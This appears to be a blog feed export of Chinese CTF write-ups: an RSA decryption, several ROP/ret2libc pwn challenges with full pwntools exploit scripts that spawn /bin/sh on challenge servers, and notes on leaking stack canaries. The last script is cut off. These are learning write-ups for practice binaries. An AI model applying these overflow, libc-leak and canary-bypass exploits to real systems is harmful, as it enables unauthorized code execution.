class="number">111</span>,<span class="number">102</span>,<span class="number">81</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">104</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.解密</span></span><br><span class="line">a = <span class="string">b&#x27;ZmxhZ3tzaHVtdV9sMHZlX2gxNV9jaGFsbGVuZzNfdmVyOV9tdTNofQ==h&#x27;</span></span><br><span class="line">tmp = base64.b64decode(a)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure>

<h3 id="unsafe-prime"><a href="#unsafe-prime" class="headerlink" title="unsafe_prime"></a>unsafe_prime</h3><p>这里考察的知识点就是当n不是由两个不相等的质数相乘得到的时的解法，属于另一种欧拉定理的运用，phin不再是(p-1)*(q-1)，而是p^3-p^2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">#from flag import flag</span></span><br><span class="line"><span class="string">import libnum</span></span><br><span class="line"><span class="string">p=getPrime(1024)</span></span><br><span class="line"><span class="string">n=p**3</span></span><br><span class="line"><span class="string">e=65537</span></span><br><span class="line"><span class="string">flag=&#x27;flag&#123;luoxiheng&#125;&#x27;</span></span><br><span class="line"><span class="string">c=pow(libnum.s2n(flag),e,n)</span></span><br><span class="line"><span class="string">print(n)</span></span><br><span class="line"><span class="string">print(c)</span></span><br><span class="line"><span class="string">#1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span></span><br><span class="line"><span class="string">#1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p = <span class="number">121216033233585299462279856144422199686140149244819402908675131452249143435823157035320400025743305736047792084067723177554239638229731651194515823556880874798950035236056266154727789682357822323822962110560589110432270068487448525123808163818606838762211746373156874518622834972063360072190758655502892772811</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p**<span class="number">3</span></span><br><span class="line">phi_n= p**<span class="number">3</span>-p**<span class="number">2</span></span><br><span class="line">c=<span class="number">1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span></span><br><span class="line">d=gmpy2.invert(e,phi_n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#print(binascii.unhexlify(hex(m)[2:]))</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line">string = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>(OGeek2019)babyrop(ret2libc)</title>
    <url>/2021/06/20/%5BOGeek2019%5Dbabyrop/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查看保护机制，32位，开了NX</p>
<p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p>
<p>IDA打开查看发现有随机数问题</p>
<p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p>
<p>通过strncmp函数比较随机数与输入数是否相等</p>
<p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p>
<p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p>
<p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p>
<p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p>
<p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p>
<p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p>
<p>这里选择泄露write_addr，然后计算出system_addr</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.因为给出了libc版本，所以我们可以直接使用<br>2.在这题中，我们可以泄露write函数的地址，然后用题目提供的动态共享库算出内存中system函数的地址<br>3.再用system函数的地址覆盖返回地址</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28990&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span> +  p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>,payload)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;write_addr: &#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr   &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr   &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>)  * <span class="string">b&#x27;a&#x27;</span> +  p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>最后脚本一跑，拿到了flag</p>
<p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>(HarekazeCTF2019)baby_rop(ret2text)</title>
    <url>/2021/06/20/%5BHarekazeCTF2019%5Dbaby_rop/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="HarekazeCTF2019-baby-rop-ret2text"><a href="#HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="[HarekazeCTF2019]baby_rop(ret2text)"></a>[HarekazeCTF2019]baby_rop(ret2text)</h2><p>查看保护机制，开了NX，64位</p>
<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
<p>IDA打开，F5查看main函数</p>
<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
<p>看见system函数</p>
<p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
<p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>

<p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_babyrop</title>
    <url>/2021/06/26/bjdctf-2020-babyrop/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>检查保护机制，开启NX，64位</p>
<p><img src="/img/image-20210626120953251.png" alt="image-20210626120953251"></p>
<p>运行程序，看见有libc的字眼，想到应该和libc泄露有关</p>
<p><img src="/img/image-20210626121205881.png" alt="image-20210626121205881"></p>
<p>shift+F12查找字符串，没有找到system(‘/bin/sh’)，看样子应该就是这个类型的题了</p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="/img/image-20210626121435224.png" alt="image-20210626121435224"></p>
<p>看到一个vuln()函数，应该会是解题的关键，点进去看，果然</p>
<p><img src="/img/image-20210626121534041.png" alt="image-20210626121534041"></p>
<p>找到了漏洞，read读入长度为0x64，buf大小为0x20，就从这个地方切入</p>
<p><img src="/img/image-20210626122951905.png" alt="image-20210626122951905"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.利用puts函数去泄露libc版本</p>
<p>2.计算偏移量，算出程序里的system函数和字符串’/bin/sh’的地址</p>
<p>3.利用溢出漏洞，构造rop，夺权</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>先泄露libc，64位程序传参时需要用到寄存器</p>
<p>当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9</p>
<p>当参数大于等于7个时，前6个就是前面6个，后面的参数就从右向左放入栈中，和32位一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary bjdctf_2020_babyrop |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210626122850728.png" alt="image-20210626122850728"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br></pre></td></tr></table></figure>

<p>然后计算偏移量，算出system和/bin/sh的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后构造rop，夺权</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25680</span>)</span><br><span class="line">elf=ELF(./bjdctf_2020_babyrop<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">context.log_level=&#x27;</span>debug<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">main=elf.sym[&#x27;</span>main<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">puts_plt=elf.plt[&#x27;</span>puts<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">puts_got=elf.got[&#x27;</span>puts<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">pop_rdi=0x400733</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">payload=b&#x27;</span>a<span class="string">&#x27;*(0x20+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span></span><br><span class="line"><span class="string">r.recvuntil(&#x27;</span>pull up your sword <span class="keyword">and</span> tell me u story!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">r.sendline(payload)</span></span><br><span class="line"><span class="string">r.recv()</span></span><br><span class="line"><span class="string">puts_addr=u64(r.recv(6).ljust(8,&#x27;</span>\x00<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">libc=LibcSearcher(&#x27;</span>puts<span class="string">&#x27;,puts_addr)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">offset=puts_addr-libc.dump(&#x27;</span>puts<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">system=offset+libc.dump(&#x27;</span>system<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">bin_sh=offset+libc.dump(&#x27;</span>str_bin_sh<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">payload=b&#x27;</span>a<span class="string">&#x27;*(0x20+8)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span></span><br><span class="line"><span class="string">r.recvuntil(&#x27;</span>pull up your sword <span class="keyword">and</span> tell me u story!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">r.sendline(payload)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>

<p>最后拿到flag</p>
<p><img src="/img/image-20210626130027859.png" alt="image-20210626130027859"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>canary</title>
    <url>/2021/12/20/canary/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于canary保护就是在距离EBP一定距离的栈帧中，用于验证是否程序有构造缓冲区的危险。而canary所在的位置一般也都在EBP-8的位置上存储着，因此 只要有机会泄露canary的位置，我们便有机会溢出程序</p>
<h1 id="泄露方式"><a href="#泄露方式" class="headerlink" title="泄露方式"></a>泄露方式</h1><h2 id="覆盖00字节读取"><a href="#覆盖00字节读取" class="headerlink" title="覆盖00字节读取"></a>覆盖00字节读取</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>由于canary是在栈中的，而一般情况下为防止read、printf等函数直接读出canary的数据，canary都是以<code>\x00</code>为结尾设计的。这时我们可以利用换行符在将buf填充满之后会将<code>\x0a</code>覆盖至canary结尾的<code>\x00</code>覆上，这样就能顺利的读出canary的数据了，之后再将<code>cannary</code>-<code>\x0a</code>即可得到真实的canary的数据</p>
<p><img src="/img/1643119852338.png" alt="1643119852338"></p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>存在<code>read</code>/<code>printf</code>等读出字符串的函数 </li>
<li>可以两次栈溢出 </li>
<li><ul>
<li><strong>第一次是覆盖00字节，泄露canary</strong></li>
<li><strong>第二次是利用canary进行攻击</strong></li>
</ul>
</li>
</ul>
<h2 id="格式化字符串读取"><a href="#格式化字符串读取" class="headerlink" title="格式化字符串读取"></a>格式化字符串读取</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>利用格式化字符串漏洞的任意读</p>
<p>由于canary的最低字节是0x00，所以不能用%s的格式当作字符串来读，而应该使用<code>%p</code>或者<code>%x</code>等当作一个数来读</p>
<p>从栈的情况看，var_8(即canary的值)距离栈顶n个字节，n/8   =x，64位Linux前六个参数用寄存器传递，后面的才从栈上读取，所以要使var_8是printf函数的第x+7个参数，因此使用“(x+6)$p”作为printf参数可以泄露出canary的值。</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p><strong>存在格式化字符串漏洞</strong></p>
<h3 id="知识点补充："><a href="#知识点补充：" class="headerlink" title="知识点补充："></a>知识点补充：</h3><p>%i$p是指打印出偏移format第i个参数的值</p>
<h2 id="One-by-one-爆破猜解"><a href="#One-by-one-爆破猜解" class="headerlink" title="One by one 爆破猜解"></a>One by one 爆破猜解</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>对于canary，虽然每次进程重启后canary会不同，但是同一个进程中的不同线程的canary却是相同的，并且通过<strong>fork</strong>函数创建的子进程中的canary也是相同的，因为<strong>fork函数会直接拷贝父进程的内存</strong></p>
<p>最低位为0x00,之后逐位爆破，<strong>因此32位的话要循环3次、64位的则需要循环7次</strong>，每次从ascii码中取。</p>
<p>如果某一位爆破成功 <strong>如<code>\x00\xXX</code>将会覆盖当前的canary末尾的这两位，使之程序认为这便是原有的canary，所以程序会继续运行</strong>，反之则会报错，由此来判断是否爆破成功（这里 愚钝的我思考了很久很久…）。</p>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>要求程序中有<code>fork</code>函数，可以使程序扩展子程序<del>(暂时还没遇到过)</del></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_babyrop2</title>
    <url>/2021/07/18/bjdctf-2020-babyrop2/</url>
    <content><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>检查保护机制，开了NX和canary，64位</p>
<p><img src="/img/image-20210718104136221.png" alt="image-20210718104136221"></p>
<p>IDA打开，查看main函数，发现里面利用到了三个函数</p>
<p><img src="/img/image-20210718104243834.png" alt="image-20210718104243834"></p>
<p>init函数，初始化输出提示</p>
<p><img src="/img/image-20210718104312978.png" alt="image-20210718104312978"></p>
<p>gift函数，存在格式化字符串漏洞</p>
<p><img src="/img/image-20210718104333802.png" alt="image-20210718104333802"></p>
<p>vuln函数，存在栈溢出漏洞</p>
<p><img src="/img/image-20210718104359430.png" alt="image-20210718104359430"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="可利用gift函数的格式化字符串漏洞，泄露canary的值"><a href="#可利用gift函数的格式化字符串漏洞，泄露canary的值" class="headerlink" title="可利用gift函数的格式化字符串漏洞，泄露canary的值"></a>可利用<code>gift</code>函数的格式化字符串漏洞，泄露<code>canary</code>的值</h5><p>得到偏移量为7</p>
<p><img src="/img/20200826223512973.png"></p>
<p>没有发现system和’/bin/sh’，只有通过vuln函数栈溢出漏洞，泄露libc地址，然后得到</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27304</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%7$p&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;u!&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;story!&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;story!&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210718110410868.png" alt="image-20210718110410868"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_c_1</title>
    <url>/2021/06/28/ciscn-2019-c-1/</url>
    <content><![CDATA[<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210429213629885.png" alt="image-20210429213629885"></p>
<p>IDA打开后F5查看main函数</p>
<p><img src="/img/image-20210423214542261.png" alt="image-20210423214542261"></p>
<p>发现没有之前做的gets()栈溢出，但是发现了一个encrypt函数，点开之后查看，找到了gets函数</p>
<p><img src="/img/image-20210423214700799.png" alt="image-20210423214700799"></p>
<p>读得内容为gets读取输入内容进入while循环之后是由strlen检查长度，strlen是从字符串开头检测到第一个\x00截断，所以只要在payload的开头置0让strlen判断错误就可以避免对payload的破坏。</p>
<h4 id="小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过"><a href="#小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过" class="headerlink" title="小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过"></a>小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过</h4><p>但这里没有发现后门函数，于是只能自己构造rop链。</p>
<p>puts()可以用来泄露libc基址。</p>
<p>gets()可以用来栈溢出，栈大小0x50。</p>
<p><img src="/img/image-20210430234840983.png" alt="image-20210430234840983"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span>      </span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span>      <span class="comment">#×64程序基本都存在的一个地址pop rdi；ret</span></span><br><span class="line"></span><br><span 